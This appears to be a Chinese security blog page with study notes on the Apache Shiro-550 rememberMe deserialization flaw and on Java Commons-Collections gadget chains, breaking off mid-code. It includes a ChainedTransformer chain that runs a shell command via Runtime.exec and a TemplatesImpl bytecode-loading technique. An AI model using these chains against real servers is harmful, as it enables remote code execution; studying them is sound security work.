<p>其它参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/op3c7v#e9db1d2a" >Shiro 550 漏洞学习（一） (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/582525812214224" >P神知识星球的TemplatesImpl在Shiro中的利用</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<ul>
<li><p><code>Shiro-550</code>原理：</p>
<p><code>1.2.4</code>及以下</p>
<p><code>Apache Shiro</code>框架提供了记住密码功能，登录成功的化会生成经过加密并且编码的<code>Cookie</code>，实际为<code>rememberMe</code>。那么在服务端就会对该<code>Cookie</code>进行<code>base64</code>解码，然后<code>AES</code>解密，最后再反序列化，这样就会导致反序列化的<code>RCE</code>漏洞，而其中<code>AES</code>加解密的<code>KEY</code>是硬编码写在源码中的。</p>
<p>修复即去掉了默认的<code>key</code></p>
</li>
<li><p><code>Shiro-721</code>原理：</p>
<p>同样也是<code>rememberMe</code>字段，不过需要一个合法的<code>rememberMe</code>字段作为前缀</p>
</li>
<li><p>识别：</p>
<ul>
<li><code>Remember Me</code>的功能</li>
<li>抓包的时候在<code>set-cookie</code>中有<code>remeberMe</code>字段</li>
<li>或者<code>key</code>不同导致的信息回传</li>
</ul>
</li>
<li><p>检测：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/search?q=shiroscan</span><br></pre></td></tr></table></div></figure></li>
<li><p>利用：</p>
<p>很多种类，用<code>ysoserial</code>吧，需要去掉<code>JSESSIONID</code>字段，具体的可以看看<code>vulhub</code>中讲到的方法。</p>
</li>
</ul>
<p>▲注：</p>
<p>自己本地调试<code>shiro-550</code>的时候，老是没办法反序列化，执行到反序列化时，即最终的<code>DefaultSerializer.java  -  deserialize</code>函数中就会抛出异常，直接跳转到异常处理去，应该是环境搭建有点问题。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221118112528568.png" alt="image-20221118112528568"></p>

        <h3 id="7-Redis"   >
          <a href="#7-Redis" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-Redis" class="headerlink" title="7.Redis"></a>7.Redis</h3>
      <ul>
<li>端口：6379</li>
</ul>

        <h1 id="TIPS"   >
          <a href="#TIPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1>
      
        <h2 id="1-目录穿越"   >
          <a href="#1-目录穿越" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-目录穿越" class="headerlink" title="1.目录穿越"></a>1.目录穿越</h2>
      <p><code>../</code>约等于<code>&#123;.&#125;</code></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/07/25/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC/">JAVA反序列化CC链笔记</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-07-25</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-08-10</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="前置说明"   >
          <a href="#前置说明" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置说明" class="headerlink" title="前置说明"></a>前置说明</h1>
      <p>依据这张图来进行一些分析</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1535" >Commons-Collections 1-7 利用链分析 – 天下大木头 (wjlshare.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/DF8C7E9CED07CAD7321EFED262F23E20.png" alt="DF8C7E9CED07CAD7321EFED262F23E20"></p>

        <h1 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1>
      <p>CC链包含了好多的<code>Transformer</code>，这部分知识在<code>P</code>神的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings" >JAVA安全漫谈</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中讲的挺清楚的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/548841448822424" >Java安全漫谈 - 09.反序列化篇(3)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，简单提一下</p>

        <h2 id="源码-8u40"   >
          <a href="#源码-8u40" class="heading-link"><i class="fas fa-link"></i></a><a href="#源码-8u40" class="headerlink" title="源码-8u40"></a>源码-8u40</h2>
      
        <h2 id="Transformer"   >
          <a href="#Transformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2>
      <p><code>Transformer</code>是⼀个接⼝，代表调用该对象的<code>transform</code>方法</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>很多的<code>transformer</code>系列对象都实现了该接口，并且进行重写，比如熟悉的像<code>InvokerTransformer</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125;<span class="keyword">catch</span>&#123;</span><br><span class="line">                <span class="comment">//...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="TransformedMap"   >
          <a href="#TransformedMap" class="heading-link"><i class="fas fa-link"></i></a><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2>
      <p>借用一下<code>p</code>神在<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings" >JAVA安全漫谈</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/548841448822424" >Java安全漫谈 - 09.反序列化篇(3)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>下的原话</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802181051056.png" alt="image-20220802181051056"></p>
<p>这里的<strong>回调</strong>感觉就是调用对应实现了<code>Transformer</code>接口的类的自定义的<code>transform</code>方法。</p>
<p>其源码如下：</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span> <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7023152376788900464L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>由于其构造函数是<code>protected</code>修饰的，所以通常是没办法在我们的代码中直接实例化对象出来的，那么就利用提供的<code>decorate</code>函数接口即可。</p>

        <h2 id="ConstantTransformer"   >
          <a href="#ConstantTransformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2>
      <p>看源码就知道</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6374440726369055124L</span>;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>即构造函数的时候传入⼀个对象，当调用<code>transform</code>方法时再将这个对象返回，最开始我想着这不是多此一举吗，有什么用捏。后面才知道，这可能就是为了传递某些无法进行序列化的类吧，比如<code>Runtime</code>的。</p>

        <h2 id="InvokerTransformer"   >
          <a href="#InvokerTransformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2>
      <p>这个可以说是很关键的一个类了，能执行任意方法。看下源码，主要关注三个参数的构造函数和<code>transform</code>函数。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8653385846894047688L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span>&#123;</span><br><span class="line">                <span class="comment">//.....</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>即当调用到该类的<code>transform</code>函数时，约等于执行<code>input.iMethodName(this.iArgs)</code>。</p>

        <h2 id="ChainedTransformer"   >
          <a href="#ChainedTransformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2>
      <p>包含了一个<code>Transformer</code>的数组，即数组中前⼀个<code>Transformer</code>的<code>transform</code>函数执行的返回结果，作为后⼀个<code>Transformer</code>的<code>transform</code>函数的参数输入</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">3514945074733160196L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>比如如下在反序列化中常见的执行<code>Runtime.exec</code>的方法</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;touch dddd&quot;</span>&#125;)&#125;);</span><br><span class="line">chain.transform(<span class="number">123</span>);<span class="comment">//这个123没啥用,随便设置</span></span><br></pre></td></tr></table></div></figure>

<p>那么实际的的调用链如下，实际调试一下应该更清楚一些。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%BB%98%E5%9B%BE.png" alt="未命名绘图"></p>
<p>所以通常情况下，我们就是需要找到能调用到某个对象的<code>transform</code>函数的链子。</p>

        <h2 id="TemplatesImpl"   >
          <a href="#TemplatesImpl" class="heading-link"><i class="fas fa-link"></i></a><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2>
      <p>这个不知道被设计出来干啥的，不过在<code>JAVA</code>反序列化中通常用来加载字节码。</p>

        <h3 id="前置知识-1"   >
          <a href="#前置知识-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/815544582812412" >Java安全漫谈 - 13.Java中动态加载字节码的那些方法</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><code>JAVA</code>虚拟机<code>JVM</code>实际加载运行的是<code>.class</code>文件，而这个<code>.class</code>文件，里面的实际数据就是字节码。那么如果我们可以自定义一个类，其构造函数为打印<code>Hello World</code>，然后将之编译成<code>.class</code>文件，然后让<code>JAVA</code>去加载，就可以触发该类的构造函数了。</p>
<p>那么这个加载<code>.class</code>文件的方法，就是<code>defineClass</code>，以下就是p神提供的一个例子，运行会打印出<code>Hello World</code>。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Method defineClass = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class,<span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);</span><br><span class="line">        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Hello&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>那么我们需要寻找的链子，就是能够调用到<code>defineClass</code>方法的链子，这里就是<code>TemplatesImpl</code>，其调用链如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.newTransformer() -&gt;TemplatesImpl.getTransletInstance() -&gt; TemplatesImpl.defineTransletClasses()-&gt; TransletClassLoader.defineClass()</span><br></pre></td></tr></table></div></figure>

<p>相关实际调用截图如下</p>

        <h3 id="链子"   >
          <a href="#链子" class="heading-link"><i class="fas fa-link"></i></a><a href="#链子" class="headerlink" title="链子"></a>链子</h3>
      
        <h4 id="TemplatesImpl-newTransformer"   >
          <a href="#TemplatesImpl-newTransformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer()"></a>TemplatesImpl.newTransformer()</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171708570.png" alt="image-20220803171708570"></p>

        <h4 id="TemplatesImpl-defineTransletClasses"   >
          <a href="#TemplatesImpl-defineTransletClasses" class="heading-link"><i class="fas fa-link"></i></a><a href="#TemplatesImpl-defineTransletClasses" class="headerlink" title="TemplatesImpl.defineTransletClasses()"></a>TemplatesImpl.defineTransletClasses()</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171741367.png" alt="image-20220803171741367"></p>

        <h4 id="TransletClassLoader-defineClass"   >
          <a href="#TransletClassLoader-defineClass" class="heading-link"><i class="fas fa-link"></i></a><a href="#TransletClassLoader-defineClass" class="headerlink" title="TransletClassLoader.defineClass()"></a>TransletClassLoader.defineClass()</h4>
      <p>这里的<code>_bytecodes[i]</code>即为<code>TemplatesImpl</code>类中私有成员，我们可以通过反射来为其赋值。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171936516.png" alt="image-20220803171936516"></p>

        <h2 id="TrAXFilter"   >
          <a href="#TrAXFilter" class="heading-link"><i class="fas fa-link"></i></a><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h2>
      <p>该类未实现<code>Serializable</code>接口，无法进行序列化，所以使用的时候通常结合<code>ConstantTransformer</code>来搭配使用。主要关注其构造函数</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrAXFilter</span> <span class="keyword">extends</span> <span class="title">XMLFilterImpl</span> </span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">private</span> TransformerImpl        _transformer;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">        TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>即会依据传入的<code>Templates</code>类对象，来调用其<code>newTransformer</code>函数，这个是不是就是可以调用到之前提到的<code>TransformerImpl.newTransformer()</code>从而加载字节码呢。</p>

        <h2 id="InstantiateTransformer"   >
          <a href="#InstantiateTransformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h2>
      <p>同样也是一个实现了<code>Transformer</code>接口的类，主要关注其构造函数和重写的<code>transform</code>函数</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstantiateTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InstantiateTransformer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = 